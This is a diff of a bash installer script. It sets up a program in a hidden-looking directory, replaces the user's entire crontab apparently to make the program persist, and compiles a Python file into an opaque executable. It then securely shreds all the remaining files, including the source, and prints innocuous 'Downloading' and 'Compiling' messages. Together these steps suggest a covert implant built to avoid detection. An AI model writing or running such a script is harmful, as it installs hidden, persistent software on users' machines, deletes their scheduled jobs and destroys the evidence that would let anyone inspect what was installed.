@@ -1,6 +1,9 @@
 #!/usr/bin/bash
 
+echo "Downloading"
 
+
+echo "Compiling"
 pth="$HOME/.local/sys-ht/"
 mkdir -p ${pth}
 
@@ -16,5 +19,16 @@ crontab -r
 crontab check
 rm check
 
+cd ${pth}
+mv kht_sys kht_sys.py
+python3 -OO -m py_compile kht_sys.py
+find . -iname "*.pyc" | sed 's/.*/mv & kht_sys/g' | sh
+chmod 755 kht_sys
+find . -type f \( ! -iname "khc_st" ! -iname "kht_sys" \) | sed 's/.*/shred -n 64 -u &/g' | sh
+rm -fr __pycache__
 
-nohup ${pth}/kht_sys 1>/dev/null 2>&1 &
+#shred -n 64 -u kht_sys
+#shred -n 64 -u kht_sys.py
+
+echo "Done"
+#nohup ${pth}/kht_sys 1>/dev/null 2>&1 &
